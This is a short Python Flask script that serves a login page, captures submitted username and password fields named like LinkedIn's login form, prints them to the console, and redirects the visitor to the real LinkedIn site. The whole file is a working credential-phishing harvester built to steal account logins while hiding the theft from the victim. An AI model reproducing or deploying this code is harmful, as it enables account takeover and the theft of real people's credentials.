from flask import Flask
from flask import redirect, render_template, request

app = Flask(__name__)

@app.route("/")
def login():
    return render_template("index.html")

@app.route("/", methods=["POST"])
def check_post():
    user = request.form["session_key"]
    password = request.form["session_password"]

    print('[*] Got -', user, password)

    return redirect("https://www.linkedin.com")
    
if __name__ == "__main__":
    app.run(debug=True)